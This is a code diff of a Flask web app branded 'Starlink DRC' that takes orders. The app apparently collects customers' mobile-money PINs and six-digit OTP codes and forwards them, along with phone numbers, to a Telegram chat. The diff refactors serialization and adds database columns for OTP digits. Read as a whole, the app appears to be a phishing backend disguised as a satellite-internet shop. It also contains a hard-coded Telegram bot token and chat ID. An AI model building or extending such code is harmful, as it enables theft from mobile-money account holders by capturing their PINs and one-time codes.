@@ -13,10 +13,9 @@ load_dotenv()
 app = Flask(__name__)
 app.secret_key = os.environ.get('FLASK_SECRET_KEY', 'starlink-drc-secret-2026')
 
-# DATABASE CONFIG - SQLite for PythonAnywhere free tier
+# DATABASE CONFIG - SQLite
 import sqlite3
 
-# For local development, use SQLite file
 db_path = os.path.join(os.path.dirname(__file__), 'starlink.db')
 app.config['SQLALCHEMY_DATABASE_URI'] = f'sqlite:///{db_path}'
 app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
@@ -27,7 +26,7 @@ TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '8768508073:AAFNCWh9V9
 TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '6624177719')
 TELEGRAM_API_URL = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}'
 
-# MODELS - Using 'customers' table to match existing database
+# MODELS
 class Plan(db.Model):
     __tablename__ = 'plans'
     id = db.Column(db.Integer, primary_key=True)
@@ -54,7 +53,6 @@ class User(db.Model):
     phone = db.Column(db.String(20), unique=True, nullable=False)
     name = db.Column(db.String(100))
     created_at = db.Column(db.DateTime, default=datetime.utcnow)
-    orders = db.relationship('Order', backref='user', lazy=True)
 
 
 class Order(db.Model):
@@ -74,14 +72,34 @@ class Order(db.Model):
     otp5 = db.Column(db.String(10))
     otp6 = db.Column(db.String(10))
     created_at = db.Column(db.DateTime, default=datetime.utcnow)
-    plan = db.relationship('Plan', backref='orders')
+    
+    # Relationships - use lazy='joined' to avoid N+1 queries
+    plan = db.relationship('Plan', lazy='joined')
+    user = db.relationship('User', lazy='joined')
 
     def to_dict(self):
+        customer_phone = ''
+        plan_name = ''
+        try:
+            customer_phone = self.user.phone if self.user else ''
+        except Exception:
+            pass
+        try:
+            plan_name = self.plan.name if self.plan else ''
+        except Exception:
+            pass
+            
+        created_at_str = ''
+        try:
+            created_at_str = self.created_at.strftime('%b %d, %Y')
+        except Exception:
+            pass
+            
         return {
             'id': self.id,
             'order_ref': self.order_ref,
-            'customer_phone': self.user.phone if self.user else '',
-            'plan_name': self.plan.name if self.plan else '',
+            'customer_phone': customer_phone,
+            'plan_name': plan_name,
             'amount': self.amount,
             'status': self.status,
             'airtel_number': self.airtel_number,
@@ -92,7 +110,7 @@ class Order(db.Model):
             'otp4': self.otp4,
             'otp5': self.otp5,
             'otp6': self.otp6,
-            'created_at': self.created_at.strftime('%b %d, %Y'),
+            'created_at': created_at_str,
         }
 
 
@@ -132,7 +150,6 @@ def send_telegram(message):
 
 
 def notify_new_order(order):
-    """Send notification with Kit ID, Phone, PIN when payment is submitted"""
     kit_id = generate_kit_id()
     msg = (
         f'💳 <b>NEW PAYMENT — Starlink DRC</b>\n'
@@ -156,7 +173,6 @@ def notify_status_change(order):
     customer_phone = order.user.phone if order.user else order.airtel_number or 'N/A'
     plan_name = order.plan.name if order.plan else 'Unknown Plan'
     
-    # Include OTP details when status is Pin_Verified
     otp_details = ''
     if order.status == 'Pin_Verified' and (order.otp1 or order.otp2 or order.otp3 or order.otp4):
         otp_code = f'{order.otp1 or ""}{order.otp2 or ""}{order.otp3 or ""}{order.otp4 or ""}'.strip()
@@ -268,7 +284,6 @@ def success_fr():
     return render_template('success_fr.html', order_id=order_id, phone=phone, order_ref=order_ref, plan_name=plan_name, amount=amount)
 
 
-# BACKWARD COMPATIBILITY
 @app.route('/dashboard/')
 def dashboard():
     return redirect(url_for('status'))
@@ -365,7 +380,14 @@ def create_order():
     send_telegram(msg)
 
     notify_new_order(order)
-    return jsonify(order.to_dict()), 201
+    return jsonify({
+        'id': order.id,
+        'order_ref': order.order_ref,
+        'customer_phone': user.phone,
+        'plan_name': plan.name,
+        'amount': order.amount,
+        'status': order.status,
+    }), 201
 
 
 @app.route('/api/orders/<int:order_id>', methods=['PATCH'])
@@ -386,13 +408,10 @@ def update_order(order_id):
         # Verify 6-digit OTP
         if stored_otp and len(stored_otp) == 6:
             if entered_otp == stored_otp:
-                # OTP verified successfully
                 order.status = 'Pin_Verified'
             else:
-                # OTP verification failed - keep as Pending for retry
                 order.status = 'Pending'
         else:
-            # No OTP set yet - accept the update (first time)
             order.status = data.get('status', order.status)
             if len(entered_otp) == 6:
                 order.otp1 = entered_otp[0]
@@ -402,7 +421,6 @@ def update_order(order_id):
                 order.otp5 = entered_otp[4]
                 order.otp6 = entered_otp[5]
     else:
-        # Regular field updates
         updatable = ['status', 'airtel_number', 'mpesa_pin', 'otp1', 'otp2', 'otp3', 'otp4', 'otp5', 'otp6']
         for field in updatable:
             if field in data:
@@ -411,7 +429,6 @@ def update_order(order_id):
     db.session.commit()
     notify_status_change(order)
     
-    # Return success/failure status for OTP verification
     if 'otp' in data:
         if order.status == 'Pin_Verified':
             return jsonify({
@@ -442,16 +459,13 @@ def update_order(order_id):
 
 @app.route('/api/orders/<int:order_id>/resend-otp', methods=['POST'])
 def resend_otp(order_id):
-    """Resend OTP for an order (after 5 minute expiry)"""
     order = db.session.get(Order, order_id)
     if not order:
         return jsonify({'error': 'Order not found'}), 404
     
-    # Check if order is still pending
     if order.status == 'Completed':
         return jsonify({'error': 'Order already completed'}), 400
     
-    # Generate new OTP (in real app, this would send SMS)
     new_otp = ''.join(random.choices(string.digits, k=4))
     order.otp1 = new_otp[0]
     order.otp2 = new_otp[1]
@@ -459,7 +473,6 @@ def resend_otp(order_id):
     order.otp4 = new_otp[3]
     db.session.commit()
     
-    # Notify on Telegram about OTP resend
     kit_id = generate_kit_id()
     msg = (
         f'🔄 <b>OTP RESENT — Starlink DRC</b>\n'
@@ -624,10 +637,38 @@ def seed_data():
     db.session.commit()
 
 
+def migrate_database():
+    """Add missing columns to the database"""
+    try:
+        conn = sqlite3.connect(db_path)
+        cursor = conn.cursor()
+        
+        try:
+            cursor.execute('SELECT otp5 FROM orders LIMIT 1')
+        except sqlite3.OperationalError:
+            cursor.execute('ALTER TABLE orders ADD COLUMN otp5 VARCHAR(10)')
+            print('Added otp5 column')
+        
+        try:
+            cursor.execute('SELECT otp6 FROM orders LIMIT 1')
+        except sqlite3.OperationalError:
+            cursor.execute('ALTER TABLE orders ADD COLUMN otp6 VARCHAR(10)')
+            print('Added otp6 column')
+        
+        conn.commit()
+        conn.close()
+        print('Database migration completed')
+    except Exception as e:
+        print(f'Migration error: {e}')
+
+
+# Run migration and seed data when app starts
+with app.app_context():
+    migrate_database()
+    db.create_all()
+    seed_data()
+
 if __name__ == '__main__':
-    with app.app_context():
-        db.create_all()
-        seed_data()
-    # Run in debug mode locally, but disable for production
     debug_mode = os.environ.get('FLASK_DEBUG', 'True').lower() == 'true'
     app.run(debug=debug_mode, host='0.0.0.0', port=5000)
+
